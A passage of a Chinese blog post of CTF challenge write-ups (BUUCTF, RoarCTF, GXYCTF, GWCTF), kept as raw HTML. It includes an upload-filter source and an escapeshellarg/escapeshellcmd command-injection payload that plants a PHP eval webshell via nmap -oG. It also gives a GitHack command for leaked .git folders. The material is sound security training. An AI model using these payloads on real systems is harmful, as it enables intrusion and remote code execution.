punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" /&gt; \n&lt;title&gt;Upload&lt;/title&gt;\n&lt;form action=\\\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\"&gt;\n上传文件&lt;input type=\\\"file\\\" name=\\\"uploaded\\\" /&gt;\n&lt;input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"上传\\\" /&gt;\n&lt;/form&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$target_path</span>  <span class=\"token operator\">=</span> <span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"/upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$t_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"/\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$uploaded_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$uploaded_ext</span>  <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_name</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_name</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$uploaded_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$uploaded_tmp</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"后缀名不能有ph！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"uploaded\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"\n            \"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"uploaded\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/jpeg\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"uploaded\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/pjpeg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"uploaded\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2048</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_tmp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&lt;\\?/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"诶，别蒙我啊，这标志明显还是php啊\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token function\">iconv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UTF-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"GBK\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0777</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_tmp</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$t_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span><span class=\"token variable\">$t_path</span><span class=\"token punctuation\">}</span></span> succesfully uploaded!\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"上传类型也太露骨了吧！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>这里只允许jpeg格式的图片上传，而且size&lt;2048</p>\n<h1><a id=\"BUUCTF_2018Online_Tool_1640\"></a>[BUUCTF 2018]Online Tool</h1>\n<p><strong>题目类型</strong>：<code>rce</code> + <code>escapeshellarg与escapeshellcmd共用漏洞</code></p>\n<p>先了解一下<code>escapeshellarg（）</code>和<code>escapeshellcmd（）</code>函数<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\79776482432847d8bd4f3b1a2e321f67.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\f23de6281577451f8c29ed538208a937.png\"/></p>\n<p>Eg：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a'\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">escapeshellarg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">escapeshellcmd</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token function\">escapeshellcmd</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">print</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">print</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">print</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n执行结果为：\n<span class=\"token string single-quoted-string\">'a'</span>\\<span class=\"token string single-quoted-string\">''</span><span class=\"token string single-quoted-string\">'\n'</span>a<span class=\"token string single-quoted-string\">'\\\\'</span>'\\'\na\\'\n</code></pre>\n<p><strong>漏洞点</strong>：单独使用<code>escapeshellarg</code> 和<code>escapeshellcmd</code> 中任意一个都不会出现问题，或者先使用<code>escapeshellcmd</code>再使用<code>escapeshellarg</code> 也不会出现问题，唯有题目中先<code>escapeshellarg</code> 在<code>escapeshellcmd</code> 会有漏洞</p>\n<p><strong>做题思路</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>    <span class=\"token comment\">//获取IP</span>\n    <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//对文件语法进行高亮显示</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token function\">escapeshellarg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//把字符串转码成可以在shell命令里使用的参数，将单引号进行转义，转义之后，再在左右加单引号</span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token function\">escapeshellcmd</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义,将&amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0A和\\xFF以及不配对的单/双引号转义</span>\n    <span class=\"token variable\">$sandbox</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glzjin\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'you are in sandbox '</span><span class=\"token operator\">.</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">;</span>\n    @<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//新建目录，默认权限，最大可能的访问权</span>\n    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//改变目录路径，成功返回true，失败返回false</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nmap -T5 -sT -Pn --host-timeout 2 -F \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// -sT，在目标主机的日志上记录大批连接请求和错误的信息</span>\n    <span class=\"token comment\">// -Pn，扫描之前不需要用ping命令，有些防火墙禁止使用ping命令</span>\n    <span class=\"token comment\">// -T5，时间优化参数，-T0~5，-T0扫描端口的周期大约为5分钟，-T5大约为5秒钟</span>\n    <span class=\"token comment\">// --host-time限制扫描时间</span>\n    <span class=\"token comment\">// -F，快速扫描</span>\n</code></pre>\n<p>代码审计<code>system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);</code><br/> 所以我们现在需要构造变量host的值，使远程命令/代码能够执行</p>\n<p>这里又需要了解一些nmap的知识点：在nmap命令中 有一个参数<code>-oG</code>可以实现将命令和结果写到文件。可以上传一句话木马，再用蚁剑链接，就可以顺利拿到flag了</p>\n<p>构造payload：<code>?host=' &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php '</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9bd940022f314cc880aa4b09a3166bfa.png\"/>然后这里返回文件名，继续用蚁剑链接</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6071c4bbad454b0294f3fd5584d1ade1.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\873a8cafdb874d83808caca0fffc218b.png\"/><br/> 拿到flag</p>\n<h1><a id=\"RoarCTF_2019Easy_Java_1709\"></a>[RoarCTF 2019]Easy Java</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\09b6f0c5558d4bcfa83406fb57f53408.png\"/><br/> 点击help，发现提示：<code>java.io.FileNotFoundException:{help.docx}</code>，访问help,dox，好吧，啥也不是<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d215fbe7e1a748e29ebbb1e518e8d2a0.png\"/></p>\n<h1><a id=\"GXYCTF2019_1717\"></a>[GXYCTF2019]禁止套娃</h1>\n<p><strong>题目类型</strong>：<code>.git</code>源码泄露 + 无参rce<br/> 用GitHack扫一下目录：<code>python GitHacker.py http://f788ff9a-e4f3-46f1-8eff-6b1ce92932f3.node4.buuoj.cn:81/.git/</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ca561aded02541ff8597532c7bee735c.png\"/>发现index.php：<code>http://f788ff9a-e4f3-46f1-8eff-6b1ce92932f3.node4.buuoj.cn:81/.git/index</code><br/> 访问一下<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6aa43e8efade47a7951c6c044b27b0d7.png\"/></p>\n<h1><a id=\"GWCTF_2019_1725\"></a>[GWCTF 2019]我有一个数据库</h1>\n<p><strong>题目类型</strong>：cve-2018-12613-PhpMyadmin后台文件包含漏洞<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\517b58dea3c34a24a721a3e6af593bec.png\"/><br/> 一看就没有utf-8编码，编码后为<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5246fc8df10b4ec48a7645339f4cfc7e.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 1, "javascript": 0, "java": 1, "sql": 1, "php": 1, "time": "2021-08-12 12:21:17", "summary": "极客大挑战极客大挑战强网杯随便注新生赛极客大挑战新生赛极客大挑战极客大挑战极客大挑战极客大挑战极客大挑战护网杯新生赛极客大挑战新生赛极客大挑战极客大挑战网鼎杯青龙组你传你呢华北赛区网鼎杯禁止套娃我有一"}